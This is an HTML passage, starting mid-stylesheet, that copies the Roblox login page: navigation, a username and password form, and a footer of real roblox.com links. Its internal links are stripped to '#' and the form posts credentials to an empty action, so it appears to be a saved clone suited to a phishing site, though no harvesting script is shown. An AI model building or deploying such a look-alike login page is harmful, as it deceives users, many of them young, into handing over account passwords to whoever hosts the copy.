.container-footer{background-color:#f2f4f5}div.ConfirmationModal{padding:5px}.unifiedModal{background-color:#e1e1e1;color:#343434;border:2px solid #272727;text-align:center;position:relative}.smallModal{width:425px}@media(max-width:480px){.smallModal{width:auto}}.login-container{margin:0 auto;max-width:400px}.login-container .login-header{margin-bottom:18px;text-align:center}.login-container .username-form-group{margin-bottom:18px}.login-container .password-form-group{margin-bottom:0}.login-container .login-button{margin:6px 0 12px}.login-container .forgot-credentials-link{font-size:16px;font-weight:300;margin-top:12px}.login-container .signup-option{margin:24px 0}.login-container .no-account-text{font-weight:400}.login-container .signup-link{margin-left:6px}.login-container .alternative-login-divider-container{position:relative;margin-bottom:6px}.login-container .alternative-login-divider-container .alternative-login-divider{margin:24px 0 0}.login-container .alternative-login-divider-container .divider-text-container{position:relative;top:-13px;text-align:center}@media(max-width:767px){.login-container .alternative-login-divider-container .divider-text-container{top:-11px}}.login-container .alternative-login-divider-container .divider-text-container .divider-text{background:#fff;padding:12px}.login-container .cross-device-login-button{margin-bottom:10px}.sf-hidden{display:none !important}</style>
    <meta http-equiv=content-security-policy content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:;">
</head>

<body id=rbx-body class="rbx-body light-theme gotham-font" data-performance-relative-value=0.005
    data-internal-page-name=Login data-send-event-percentage=0>
    <div id=image-retry-data data-image-retry-max-times=30 data-image-retry-timer=500 data-ga-logging-percent=10>
    </div>
    <div id=http-retry-data data-http-retry-max-timeout=0 data-http-retry-base-timeout=0 data-http-retry-max-times=1>
    </div>
    <div id=wrap class="wrap no-gutter-ads logged-out" data-gutter-ads-enabled=false>
        <div id=navigation-container class="light-theme gotham-font" data-number-of-autocomplete-suggestions=7
            data-is-redirect-library-to-creator-marketplace-enabled=True>
            <div id=header class="navbar-fixed-top rbx-header" role=navigation>
                <div class=container-fluid>
                    <div class=rbx-navbar-header>
                        <div id=header-menu-icon class=rbx-nav-collapse><button type=button
                                class="btn-primary-xs btn-min-width" id=skip-to-main-content>Skip to Main
                                Content</button></div>
                        <div class=navbar-header>
                            <a class=navbar-brand href="#">
                                <span class=icon-logo></span><span class="icon-logo-r sf-hidden"></span>
                            </a>
                        </div>
                    </div>
                    <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
                        <li>
                            <a class="font-header-2 nav-menu-title text-header"
                                href="#">Discover</a>
                        </li>
                        <li>
                            <a class="font-header-2 nav-menu-title text-header"
                                href="#">Avatar Shop</a>
                        </li>
                        <li>
                            <a class="font-header-2 nav-menu-title text-header"
                                href="#">Create</a>
                        </li>
                        <li>
                            <a class="font-header-2 nav-menu-title text-header robux-menu-btn"
                                href="#">
                                <div class=menu-text-container>
                                    <span class="robux-10-percent-more-label sf-hidden">10% More</span>
                                    <span class="font-header-2 robux-btn">
                                        <font style=vertical-align:inherit>
                                            <font style=vertical-align:inherit>Robux</font>
                                        </font>
                                    </span>
                                    <span class="font-header-2 buy-robux-btn sf-hidden">Buy Robux</span>
                                </div>
                            </a>
                        </li>
                    </ul>
                    <ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12 sf-hidden">
                    </ul>
                    <div id=right-navigation-header>
                        <div data-testid=navigation-search-input
                            class="navbar-left navbar-search col-xs-5 col-sm-6 col-md-2 col-lg-3 shown" role=search>
                            <div class=input-group>
                                <form>
                                    <div class=form-has-feedback><input id=navbar-search-input
                                            data-testid=navigation-search-input-field
                                            class="form-control input-field new-input-field" placeholder=Search
                                            maxlength=120 autocomplete=off autocorrect=off autocapitalize=off
                                            spellcheck=false value></div>
                                </form>
                                <div class=input-group-btn><button data-testid=navigation-search-input-search-button
                                        class=input-addon-btn type=submit><span
                                            class=icon-common-search-sm></span></button></div>
                            </div>
                            <ul class="dropdown-menu new-dropdown-menu sf-hidden" role=menu></ul>
                        </div>
                        <div class="navbar-right rbx-navbar-right">
                            <ul class="nav navbar-right rbx-navbar-right-nav">
                                <li class=signup-button-container><a
                                        class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button"
                                        href="#"
                                        id=sign-up-button>Sign Up</a>
                                <li class=login-action>
                                <li class="rbx-navbar-right-search sf-hidden">
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class=container-main id=container-main tabindex=-1>
            <div class=alert-container>
                <noscript>
                    <div>
                        <div class="alert-info" role="alert">Please enable Javascript to use all the features on this
                            site.</div>
                    </div>
                </noscript>
            </div>
            <div class=content>
                <div id=react-login-container class=login-container data-return-url data-enable-react-ui=true>
                    <div id=login-base>
                        <div class="section-content login-section">
                            <h1 class=login-header>Login to Roblox</h1>
                            <div id=login-form>
                                <div>
                                    <div class=login-form-container>
                                        <form action="" method="post">
                                            <div class="form-group username-form-group"><label for=login-username
                                                    class=sr-only>Username/Email/Phone</label><input id=login-username
                                                    name=username type=text class="form-control input-field"
                                                    placeholder=Username/Email/Phone required value></div>
                                            <div class="form-group password-form-group"><label for=login-password
                                                    class=sr-only>Password</label><input id=login-password name=password
                                                    type=password class="form-control input-field" placeholder=Password
                                                    required value>
                                                <div aria-live=polite></div>
                                            </div>
                                            <button class="btn-full-width login-button btn-secondary-md" type=submit>Log In</button>
                                        </form>
                                    </div>
                                </div>
                            </div>
                            <div class="text-center forgot-credentials-link"><a id=forgot-credentials-link
                                    class=text-link href="#"
                                    target=_self>Forgot Password or Username?</a></div>
                            <div>
                                <div class=alternative-login-divider-container>
                                    <div class="rbx-divider alternative-login-divider"></div>
                                    <div class=divider-text-container><span class="divider-text xsmall">login
                                            with</span></div>
                                </div><button type=button id=cross-device-login-button
                                    class="btn-full-width btn-control-md cross-device-login-button"><span>Another Logged
                                        In Device</span></button>
                            </div>
                            <div id=crossDeviceLoginDisplayCode-container data-frontload-qr-code=false>
                                <div></div>
                            </div>
                            <div id=otp-login-container></div>
                            <div class=text-center>
                                <div class=signup-option><span class=no-account-text>Don't have an account?</span><a
                                        id=sign-up-link class="text-link signup-link" href="#"
                                        target=_self>Sign Up</a></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <footer class=container-footer id=footer-container data-is-giftcards-footer-enabled=True>
            <div class=footer>
                <ul class="row footer-links">
                    <li class=footer-link><a class=text-footer-nav
                            href="https://www.roblox.com/info/about-us?locale=en_us" target=_blank>About Us</a>
                    <li class=footer-link><a class=text-footer-nav href="https://www.roblox.com/info/jobs?locale=en_us"
                            target=_blank>Jobs</a>
                    <li class=footer-link><a class=text-footer-nav href="https://www.roblox.com/info/blog?locale=en_us"
                            target=_blank>Blog</a>
                    <li class=footer-link><a class=text-footer-nav
                            href="https://www.roblox.com/info/parents?locale=en_us" target=_blank>Parents</a>
                    <li class=footer-link><a class="text-footer-nav giftcards"
                            href="https://www.roblox.com/giftcards?locale=en_us" target=_blank>Gift Cards</a>
                    <li class=footer-link><a class=text-footer-nav href="https://www.roblox.com/info/help?locale=en_us"
                            target=_blank>Help</a>
                    <li class=footer-link><a class=text-footer-nav href="https://www.roblox.com/info/terms?locale=en_us"
                            target=_blank>Terms</a>
                    <li class=footer-link><a class=text-footer-nav
                            href="https://www.roblox.com/info/accessibility?locale=en_us"
                            target=_blank>Accessibility</a>
                    <li class=footer-link><a class="text-footer-nav privacy"
                            href="https://www.roblox.com/info/privacy?locale=en_us" target=_blank>Privacy</a>
                    <li>
                </ul>
                <div class="row copyright-container">
                    <div class="col-sm-6 col-md-3"></div>
                    <div class=col-sm-12>
                        <p class="text-footer footer-note">©2022 Roblox Corporation. Roblox, the Roblox logo and
                            Powering Imagination are among our registered and unregistered trademarks in the U.S. and
                            other countries.</p>
                    </div>
                </div>
            </div>
        </footer>
    </div>
</body>